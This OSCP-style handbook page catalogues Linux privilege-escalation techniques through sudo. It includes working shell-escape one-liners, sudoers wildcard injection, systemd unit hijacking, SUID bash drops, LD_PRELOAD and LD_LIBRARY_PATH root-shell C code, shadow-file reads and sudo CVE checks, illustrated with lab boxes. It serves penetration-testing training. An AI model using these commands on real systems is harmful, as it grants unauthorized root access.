---
title: "Sudo"
slug: sudo
category: notes
handbook: oscp
tags: ["privilege-escalation", "linux"]
draft: false
pubDatetime: 2026-07-19T23:38:46+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "`sudo` runs a program with another user's privileges, root by default."
---
`sudo` runs a program with another user's privileges, root by default. Which users may run what is set by rules in `/etc/sudoers`, and those rules can drop the password requirement or restrict a user to specific programs. Any sudo access is a lead, and it sits first on the [Privilege Escalation](/collections/oscp/privilege-escalation-linux) triage list because it is the vector the system was configured to allow.

## Enumerate

```bash
sudo -l                 # what the current user may run, and as whom
```

`sudo -l` is the opening move. It lists each permitted command, the user it runs as (usually root), whether a password is needed (`NOPASSWD`), and the active `Defaults` line. Everything below keys off what it prints.

```bash
sudo <program>          # run one program as root
sudo -u <user> <program># run as a specific user
```

## Full Sudo Access

If the user may run anything (`(ALL : ALL) ALL`) and the password is known, use sudo as intended and switch to a root shell:

```bash
sudo su
```

If `su` is not permitted, the same result comes through any of:

```bash
sudo -s
sudo -i
sudo /bin/bash
sudo passwd          # set a new root password directly
```

The password column matters as much as the command list. From a shell inherited off a web service there is no password to type and often no TTY to type it into, so `(ALL : ALL) ALL` on its own is a dead rule until credentials turn up, while a second line reading `(ALL) NOPASSWD: ALL` is root in one command. On bullyBox both lines were present and only the `NOPASSWD` one mattered. Check `id` on landing too: a service running as a normal account rather than `www-data` is a hint that the account has a login and rules of its own.

Rules are matched per command, so a `NOPASSWD` line naming one binary does not make anything else passwordless. `(ALL : ALL) ALL` sitting above `(ALL) NOPASSWD: /usr/bin/env`, as on Jordak, means only `env` runs free; every other command falls through to the first rule and needs the password. Without a TTY that prompt is not even reachable:

```text
sudo: a terminal is required to read the password; either use the -S option ...
sudo: a password is required
```

That message is about the missing terminal, not a wrong password. To see which rule a command binds to without waiting on a prompt, use `sudo -n`, which fails outright instead of asking:

```bash
sudo -n /usr/bin/env true    # succeeds silently -> covered by NOPASSWD
sudo -n su                   # sudo: a password is required
```

## Restricted to Specific Programs

Most of the time `sudo -l` allows only a named program, often `NOPASSWD`. That single entry is usually enough.

Shell escape sequences. Many programs can spawn a shell from inside themselves. Because the program runs as root, so does the shell. GTFOBins lists the exact escape for each binary under its `Sudo` function, so check it first. Classic examples:

```bash
sudo vim -c ':!/bin/sh'
sudo less /etc/profile        # then :!/bin/sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo service ../../bin/sh     # service runs its arg as a path -> /bin/sh
sudo rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x   # -e swaps the remote-shell transport for a command
```

rsync's `-e` names the program it uses to reach a remote host in place of `ssh`, so pointing it at a shell runs that instead, wired to the terminal's own file descriptors so it behaves like an interactive shell rather than a one-shot command. `x:x` are throwaway source and destination arguments, rsync needs both to get far enough to invoke the `-e` program at all, and their actual value does not matter. A bare `NOPASSWD: /usr/bin/rsync` with no pinned arguments, as on Zab, is this GTFOBins line unmodified; a rule ending in `*` instead is the wildcard-injection variant using the same `-e` flag, covered below.

`service` is the less obvious one. It is not an editor with a `!` escape, it takes a service name and executes the matching init script, so a relative path like `../../bin/sh` walks out of its script directory and runs `/bin/sh` as root. A lone `NOPASSWD: /usr/sbin/service` was the whole privesc on Crane.

A custom binary standing in for the program that actually escapes. Naming a bespoke wrapper in sudoers instead of a stock binary looks like it closes off GTFOBins, but the wrapper still has to do something once it runs, and that something is often just calling the stock program anyway. `strings` on the binary reads the whole thing off before it's ever executed: any prompt text, and any hardcoded password or key it checks against. On BlackGate, `strings /usr/local/bin/redis-status` gave up both a plaintext authorization key and the fact that a correct key makes it `system("/usr/bin/systemctl status redis")`, whose output pipes through a pager exactly like the `less`/`journalctl` case above, so `!/bin/sh` inside it was still root. The wrapper's own "wrong key" message printed a scare line about the incident being reported; it was a bare `printf`, nothing was actually logged or alerted. Getting past the gate is a `strings` read, not a guess, and the payoff underneath is whatever GTFOBins already lists for the program the wrapper calls. See [Credential Hunting](/collections/oscp/credential-hunting).

Programs that exist to run other programs. Some entries need no escape at all, because taking a command line and executing it is the whole purpose of the binary. `env`, `nice`, `timeout`, `nohup`, `xargs`, `stdbuf`, and `setarch` all fall in this group, so the shell is simply the argument:

```bash
sudo env /bin/bash -p
sudo nice /bin/bash
sudo timeout 7d /bin/bash
```

Jordak allowed `(ALL) NOPASSWD: /usr/bin/env`, and `sudo /usr/bin/env /bin/bash -p` returned root immediately. `sudo env ...` unqualified matches the same rule, because `secure_path` resolves it to `/usr/bin/env`.

`openvpn` is the sneaky relative of this group: a sudo rule on the binary is a root-hook primitive rather than a shell escape. `--script-security 2` lets OpenVPN run external scripts, and `--up` names one to run when the device opens:

```bash
sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'
```

`/bin/sh -s` reads the "script" from stdin, so the root shell is interactive and nothing touches disk; `--dev null` avoids needing a real interface. A plain `(ALL : ALL) /usr/sbin/openvpn` rule was root on Medtech, and it worked from inside a restricted SSH shell because `sudo` itself was still allowed.

Abusing intended functionality. When a program has no shell escape, its normal features can still leak or plant root-owned data:

- File read. A program that prints file contents or errors on bad input can be aimed at a file that is otherwise unreadable. The course example feeds `/etc/shadow` to `apache2` as a config file so its parser echoes each line back in an error:

  ```bash
  sudo apache2 -f /etc/shadow
  # Syntax error on line 1 of /etc/shadow: Invalid command 'root:$6$...'
  ```

  Extract the hash and crack it as in [Weak File Permissions](/collections/oscp/weak-file-permissions). Other readers with the same effect: `sudo cat`, `sudo more`/`less`, `sudo tail`, `sudo cp /etc/shadow /tmp/...`.
- File write. A program that writes where directed (`tee`, `dd`, an editor's save) can overwrite `/etc/passwd`, `/etc/shadow`, a cron file, or a root-owned script. See the writable-file abuses in [Weak File Permissions](/collections/oscp/weak-file-permissions).
- Process memory. A dumper allowed under sudo (`gcore`, `gdb`) runs as root and can attach to any process, so it reads credentials out of live process memory instead of off disk. On Pelican a sudo `gcore` rule dumped a root `password-store` process and the core held root's password. See the process-memory method in [Credential Hunting](/collections/oscp/credential-hunting).

Package managers with command hooks. `apt`, `apt-get`, and `dpkg` run configuration hooks as root, so a sudo rule on one of them is a root shell through a hook, not a shell escape. Two GTFOBins forms exist and only one works on a box with no internet:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh    # -> root shell, no network
```

`Pre-Invoke` fires before apt touches the network, so `update` runs the hook and never needs a mirror. The install variant points a `Dpkg::Pre-Invoke` hook at a shell but has to actually install a package first:

```bash
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > /tmp/hook
sudo apt-get install -c /tmp/hook sl
```

That only fires if the named package is not already present and apt can fetch it, so on an offline lab box it dies at the download (`Connection refused` / `Network is unreachable`) and the hook never runs. Reach for the `update -o ...Pre-Invoke` one-liner first, which needs neither a package nor a working mirror. On Press the install form died at the mirror and the `update` line returned root in one command.

A pinned script path. When the rule names an interpreter running one specific script, `NOPASSWD: /usr/bin/ruby /home/user/app/app.rb`, the escalation is not the GTFOBins shell escape for that interpreter. The rule matches the exact command string, so `sudo ruby -e 'exec "/bin/sh"'` is a different command and sudo prompts for a password. If the pinned script is writable, which it often is when it sits in the user's own home, overwrite its contents with a shell spawn and run the allowed command unchanged:

```bash
echo 'exec "/bin/bash"' > /home/user/app/app.rb   # ruby
sudo /usr/bin/ruby /home/user/app/app.rb          # -> root shell
```

The same holds for any interpreter (`python`, `perl`, `bash`) or a compiled program that sources a writable config. RubyDome pinned `ruby /home/andrew/app/app.rb`, which andrew owned, so overwriting it with `exec "/bin/bash"` returned root.

A build tool with its own script hooks reads the same way. `composer run-script <name>` looks up `<name>` under `scripts` in the target directory's `composer.json` and runs whatever it maps to, so a `NOPASSWD` rule pinned to `composer --working-dir=<dir> run-script` is a file-write escalation into that one directory's `composer.json`:

```json
{"scripts": {"x": "/bin/sh"}}
```

```bash
sudo /usr/bin/composer --working-dir=<dir> run-script x
```

If the account holding the sudo rule cannot itself write to `<dir>`, the rule is still live as long as some other account the same operator controls can. On LaVita the sudo rule belonged to a user with no write access to `/var/www/html/lavita`, but the web-server user from the initial foothold did have it and had never been given up; adding the `x` script from that shell and then running the sudo'd composer command from the other one closed the gap. Worth checking before writing off a pinned-directory rule as unreachable: the write access it needs does not have to belong to the account that holds the rule.

When the script is not writable, check who owns the directory it sits in before dropping the rule. Write permission on a directory allows deleting and creating entries inside it whatever the files themselves are set to, so a `root:root 644` script in a directory owned by the current user is replaceable even though it cannot be edited:

```bash
ls -l  /home/walter/wifi_reset.py    # -rw-r--r-- 1 root root   -> cannot write
ls -ld /home/walter                  # drwxr-xr-x www-data www-data -> can delete
cd /home/walter
rm wifi_reset.py                     # prompts: remove write-protected file? y
echo 'import os; os.setuid(0); os.system("/bin/sh")' > wifi_reset.py
sudo /usr/bin/python /home/walter/wifi_reset.py
```

On Walla that was root, and an editor reporting `is unwritable` had already made the path look closed. The recreated file loses the original mode and owner, which does not matter when sudo names an interpreter and passes the script as an argument, since it is read rather than executed. It does matter when the rule runs the file directly, where the executable bit and the shebang both have to be restored. `os.setuid(0)` belongs in a python payload because the interpreter runs as root but hands a child shell the calling user's real UID otherwise.

Type the rule back exactly. `sudo usr/bin/python /home/walter/wifi_reset.py`, one leading slash short, matched no rule on Walla and produced `[sudo] password for www-data:`. On a `NOPASSWD` box a password prompt is not a permissions problem, it is sudo saying the command string is not the one allowed.

A pinned service. `systemctl restart NAME.service` looks tightly scoped, but the unit file's `ExecStart` is the command systemd runs as root, so being able to write that line is arbitrary root execution. A rule granting `systemctl daemon-reload` alongside it removes the ambiguity, since a reload is only needed after a unit file changes. On SpiderSociety the pair appeared together:

```text
(ALL) NOPASSWD: /bin/systemctl restart spiderbackup.service
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) !/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo
```

Find the unit and what it calls:

```bash
systemctl cat spiderbackup.service
ls -la /etc/systemd/system/spiderbackup.service
ls -ld /etc/systemd/system /etc/systemd/system/spiderbackup.service.d
```

Three places to write, and which one is open varies. On SpiderSociety the obvious target was closed and the unit file itself was writable, which is the reverse of what the `daemon-reload` grant might suggest is unnecessary. Check all three before concluding the rule is not the path:

- **The `ExecStart` target.** A unit calling `/opt/backup.sh` needs only that script writable and the unit file can stay root-owned. No reload, because the unit did not change. Overwrite the body with `>` rather than recreating the file, so the existing executable bit survives, and keep the shebang:

  ```bash
  cp /opt/backup.sh /tmp/backup.sh.bak
  cat > /opt/backup.sh <<'EOF'
  #!/bin/bash
  cp /bin/bash /tmp/rootbash
  chmod u+s /tmp/rootbash
  EOF
  sudo /bin/systemctl restart spiderbackup.service
  /tmp/rootbash -p
  ```

- **The unit file**, replacing `ExecStart` outright, then reload and restart.
- **A drop-in** at `/etc/systemd/system/NAME.service.d/override.conf`, which overrides the unit without editing it. An empty `ExecStart=` has to come first to clear the original.

```bash
cat > /etc/systemd/system/spiderbackup.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash'
EOF
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart spiderbackup.service
/tmp/rootbash -p
```

The SUID payload is steadier than a reverse shell in a unit, because it runs and exits immediately and systemd's opinion of whether the service started is irrelevant. A `Failed to start` on the restart is not a failed exploit, so check `ls -la /tmp/rootbash` for the `s` bit before changing anything. Copying bash aside rather than setting SUID on `/bin/bash` itself leaves the system binary intact for whatever the service was actually for, and `-p` is required either way or bash drops the elevated euid at startup. If `/tmp` is mounted `nosuid` the copy runs unprivileged, and a reverse shell in the same slot is the fallback, with the listener started before the restart and `systemctl restart` hanging until the shell closes.

A deny list in the same rule does not apply. `!/bin/bash, !/bin/sh, !/bin/su, !/usr/bin/sudo` only blocks those binaries as sudo commands, and here systemd spawns the payload as root on its own.

## Rules That Grant Information, Not Execution

Not every `NOPASSWD` entry is a path. A lone rule looks like the intended route and deserves the attention, but some programs have nothing to escape into, and the environment defaults close the rest.

```text
(ALL) NOPASSWD: /bin/ps aux
```

`ps` on Sea is the worked example. The arguments are pinned, so `ps -ef` and `ps auxe` are different commands and prompt for a password. There is no shell escape and no pager, which is what separates it from `systemctl` or `journalctl`, whose output goes through `less` and takes `!sh`. `env_reset` drops `LD_PRELOAD` and `ps`'s own `PS_FORMAT`/`PS_PERSONALITY` variables, and `secure_path` plus an absolute path in the rule closes the PATH route even when a writable directory sits first in the user's own `PATH`. GTFOBins has no entry for it because there is nothing to write.

What the rule leaves is a root-visible process list. That is only worth something when `/proc` is mounted `hidepid=1` or `hidepid=2`, because an unprivileged `ps` and [pspy](/collections/oscp/pspy) both go blind there while the sudo'd one does not. One command decides it:

```bash
ps aux > /tmp/a; sudo /bin/ps aux > /tmp/b; diff /tmp/a /tmp/b
```

An empty diff means the rule grants nothing that was not already readable. If it does grant something, the value is in short-lived root processes with credentials in argv, so run it in a loop rather than once and dedupe on the command:

```bash
while :; do sudo /bin/ps aux; done \
  | awk '{ for(i=1;i<=10;i++) $i=""; sub(/^ +/,""); if (!seen[$0]++) print }'
```

`ps` also truncates each line to the terminal width when stdout is a TTY, so redirect or pipe it to get the full argv, which is where a password on a command line would be. The general rule: work out what a sudo entry actually produces before assuming it produces root, and set a time limit on it.

## Argument Wildcards

A rule that ends in `*` is exploitable on its own, whatever the program is:

```text
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

sudo does not match arguments one at a time. It joins the whole argument list into a single string and runs one `fnmatch()` against the sudoers pattern, and for the argument portion it does not pass `FNM_PATHNAME`, so `*` matches spaces and slashes and therefore matches extra options. The rule reads as "keep `-czvf /tmp/backup.tar.gz` exactly, then append anything", which lets a program's own dangerous flags through. `tar` has `--checkpoint-action=exec=`:

```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Two things this needs. Keep the pinned prefix verbatim: the GTFOBins `tar` line uses `-cf /dev/null`, which is a different command from the one sudoers permits, so it prompts for a password. And tar needs a member to archive, or it exits with "Cowardly refusing to create an empty archive" before the checkpoint fires and a correct payload looks broken. The `*` above expands to the current directory's contents and supplies one; from an empty directory, name a member such as `/dev/null` explicitly. On Cockpit this was root, and the wasted time was running the GTFOBins line unmodified, the same reflex that fails on the pinned-script case above.

The same wildcard flaw applies to other programs whose flags can run a command or write a file. `tar` has `--checkpoint-action` and `--use-compress-program`/`-I`; `rsync` has `-e`/`--rsh`; `zip` has `-T`/`-TT`. GTFOBins lists the argument-injection variant for each under its `Sudo` function.

This is distinct from the *filename* wildcard trick, where a root cron or script runs `tar cf ... *` inside a directory and the shell glob feeds attacker-named files (`--checkpoint-action=exec=...`) in as arguments. That needs a writable directory and a job that is not itself controlled; the sudoers case above needs neither, because the command line is entered directly.

## Preserved Environment Variables

Programs run through sudo normally get a clean environment (`env_reset` in `/etc/sudoers`). `env_keep` whitelists variables that survive into the sudo'd program, and `sudo -l` prints the active `Defaults` line. If it keeps `LD_PRELOAD` or `LD_LIBRARY_PATH`, that is a root shell regardless of which program is allowed:

```text
Matching Defaults entries for user:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

### LD_PRELOAD

`LD_PRELOAD` names a shared object the dynamic linker loads before all others, into every program that starts. A shared object can define a constructor, a function that runs automatically the moment the object loads, before the program's own `main()`. Point `LD_PRELOAD` at an object whose constructor spawns a shell and run any allowed sudo program: sudo runs it with effective UID 0, the linker loads the object first, and the constructor fires as root before the program does anything. The allowed program is only a trigger, so which one it is does not matter. Requires `env_keep+=LD_PRELOAD`.

```c
// preload.c
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so <allowed-program>   # -> root shell
```

Any allowed program works, because it never really runs: the constructor spawns the shell first.

### LD_LIBRARY_PATH

`LD_LIBRARY_PATH` lists directories the dynamic linker searches for shared libraries first. Build a malicious library with the same soname as one the program loads, give it a constructor that spawns a shell, place it in a directory, and point `LD_LIBRARY_PATH` there. The program loads the fake instead of the real library and the constructor runs as root:

```bash
ldd /usr/sbin/apache2         # pick a listed lib, e.g. libcrypt.so.1
```

```c
// library_path.c
#include <stdlib.h>
#include <unistd.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

```bash
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2    # loads the fake libcrypt.so.1 -> root
```

Hit or miss: try different libraries from `ldd` output, `libcrypt.so.1` tends to work. These two tricks apply to sudo only. The dynamic linker ignores `LD_PRELOAD` and `LD_LIBRARY_PATH` for SUID binaries, covered in [SUID Binaries](/collections/oscp/suid-binaries).

## Old sudo Itself

The `sudo` binary has had its own local root bugs. Check `sudo --version` against known CVEs, as with any [Service Exploits](/collections/oscp/service-exploits). An old version number on its own is not a finding, each of these applies to a specific range and two of the three need a precondition beyond the version:

| CVE | Affected versions | Precondition |
| --- | --- | --- |
| CVE-2019-14287 (`sudo -u#-1`) | < 1.8.28 | a sudoers rule granting the user a command as `ALL, !root` |
| CVE-2021-3156 (Baron Samedit) | 1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1 | none, any local user |
| CVE-2019-18634 (pwfeedback overflow) | 1.7.1 to 1.8.25p1 | `Defaults pwfeedback` in sudoers |

Baron Samedit is the one worth reaching for because it needs no sudoers entry, but the range starts at 1.8.2, so anything older is out. A 1.7.x version leaves only pwfeedback, which is not the default on Ubuntu or Debian. Seeing asterisks while typing a password confirms it is enabled. Without a password to type:

```bash
grep -i pwfeedback /etc/sudoers                                   # if readable
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id         # segfault => vulnerable
```

The equivalent check for Baron Samedit is `sudoedit -s '\'` returning `sudoedit: /: not a regular file` rather than a usage error.

## Checklist

- `sudo -l` first, every time, and read the `Defaults` line.
- Full access plus known password: `sudo su` / `-s` / `-i`.
- Several rules listed: match the command to the rule, only the `NOPASSWD` one is usable without a password.
- Allowed program only runs other programs (`env`, `nice`, `timeout`): the shell is the argument.
- Restricted program: GTFOBins shell escape, then file-read or file-write abuse.
- Rule names `apt`/`apt-get`: `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh`, which needs no network unlike the install-hook form.
- Rule ends in `*`: append the program's command-running flag, keeping the pinned prefix verbatim.
- `env_keep` includes `LD_PRELOAD` or `LD_LIBRARY_PATH`: preload a shared object.
- Program has no escape and produces only output (`ps`): treat it as an information primitive, `diff` it against the unprivileged run, and move on if nothing differs.
- No functional abuse: check the `sudo` version for CVEs.
